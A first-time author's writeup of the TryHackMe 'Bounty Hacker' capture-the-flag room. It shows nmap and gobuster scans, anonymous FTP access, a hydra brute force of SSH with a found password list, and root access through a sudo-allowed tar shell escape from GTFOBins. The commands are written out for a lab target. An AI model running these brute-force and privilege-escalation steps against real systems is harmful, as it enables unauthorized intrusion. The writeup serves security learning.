---
title: Bounty Hacker CTF Writeup
tags:
  - tryhackme
  - ctf
  - easy
---
# [Bounty Hacker CTF](https://tryhackme.com/r/room/cowboyhacker) - TryHackMe

**Author:** [Sevuhl](https://tryhackme.com/p/Sevuhl)  
**Date:** July 31, 2020  
**Category:** General   
**Difficulty:** Easy   

---
## Challenge Description

The following was the given description of the CTF. 
"You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker! You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future!" 
Kind of corny in my opinion but we move.
Basically we have to answer a few basic questions about the given machine. Which are:
- Find open ports on the machine
- Who wrote the task list?
- What service can you bruteforce with the text file found?
- What is the users password?
- user.txt
- root.txt

---

First I deployed the machine and ran a basic [[Nmap]] scan to find the open ports.

```
nmap <ip-address> -vv -T4 
```

This is the result we got

```
PORT      STATE  SERVICE         REASON
20/tcp    closed ftp-data        conn-refused
21/tcp    open   ftp             syn-ack
22/tcp    open   ssh             syn-ack
80/tcp    open   http            syn-ack
990/tcp   closed ftps            conn-refused
40193/tcp closed unknown         conn-refused
40911/tcp closed unknown         conn-refused
41511/tcp closed unknown         conn-refused
42510/tcp closed caerpc          conn-refused
44176/tcp closed unknown         conn-refused
44442/tcp closed coldfusion-auth conn-refused
44443/tcp closed coldfusion-auth conn-refused
44501/tcp closed unknown         conn-refused
45100/tcp closed unknown         conn-refused
48080/tcp closed unknown         conn-refused
49152/tcp closed unknown         conn-refused
49153/tcp closed unknown         conn-refused
49154/tcp closed unknown         conn-refused
49155/tcp closed unknown         conn-refused
49156/tcp closed unknown         conn-refused
49157/tcp closed unknown         conn-refused
49158/tcp closed unknown         conn-refused
49159/tcp closed unknown         conn-refused
49160/tcp closed unknown         conn-refused
49161/tcp closed unknown         conn-refused
49163/tcp closed unknown         conn-refused
49165/tcp closed unknown         conn-refused
49167/tcp closed unknown         conn-refused
49175/tcp closed unknown         conn-refused
49176/tcp closed unknown         conn-refused
49400/tcp closed compaqdiag      conn-refused
49999/tcp closed unknown         conn-refused
50000/tcp closed ibm-db2         conn-refused
```

next we have a look at the website and also run [[Gobuster]] on it along the side with a common wordlist.

```
gobuster dir -u http://<ip-address> -w /usr/share/wordlists/dirb/common.txt
```

Well that did not reveal anything interesting. So After that I tried to anonymous login to ftp

```
ftp -h <ip-address>
```

I used the username `anonymous` without any password. This worked.
I wanted to list down all the files on the ftp-server but I could not use `ls` command. It kept giving me this odd response: 
```
229 Entering Extended Passive Mode (|||19499|)
```

A quick search told me that there a two different modes passive and Extended passive mode. I don't know the details however I will look into it later.  
I ran the `help` command to look for the available commands . There I found `dir` which chatgpt told me works similar to `ls -l` . I used it and got two files.
- locks.txt
- tasks.txt
I downloaded both files using the `get` command. looking into the tasks.txt file I found a username at the end 
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-***
```
This answered the first question.
Next looking at locks.txt I found a list of alphanumeric strings that looked like passwords. the SSH port (22) was also open. I had the Ip-address I had the username and a list of passwords. I could try brute forcing it. This also answered one of our questions of which service can be bruteforced.

I used [[hydra]] to brute force SSH using the following command

```
hydra -l *** -P locks.txt ssh://<ip-address>
```

I got the following response

```
[DATA] attacking ssh://<ip-address>/
[22][ssh] host: 10.10.8.22   login: ***   password: *****************
1 of 1 target successfully completed, 1 valid password found
```

This answered one of our questions as well.

I used the password and the username to log in to SSH

I ran a simple `ls` command to find out what was inside and found the user.txt with a flag inside.
 to find the root.txt I tried to run the find command but was unable to find anything interesting without root privileges. I was unable to run using `sudo` as I did not have root permissions. 
 I got stuck here and looked into another writeup where I found that I could use  `sudo -l` to list the allowed commands. It gave me the following response:
 ```
 User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

I had a quick look at [GTFO Bins](https://gtfobins.github.io/) to find this about `tar`

It can be used to break out from restricted environments by spawning an interactive system shell.

```
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

After running this command I was able to run the following find command:

```
sudo find / -name root.txt 2>/dev/null
```

I got the root.txt and found the last flag. That finishes our CTF. 

## Conclusion
The CTF itself was pretty easy. Other than the last step for privilege escalation using `tar` I was able to figure out everything myself. 

> [!NOTE] NOTE
> This was my first Writeup to any CTF. I tried my best. It must definitely be lacking in many areas. Still I hope it helped. If you could provide me with some feedback that would be great. It would help me improve in the future. You can contact me through [LinkedIn](https://www.linkedin.com/in/mraum/). Thankyou!

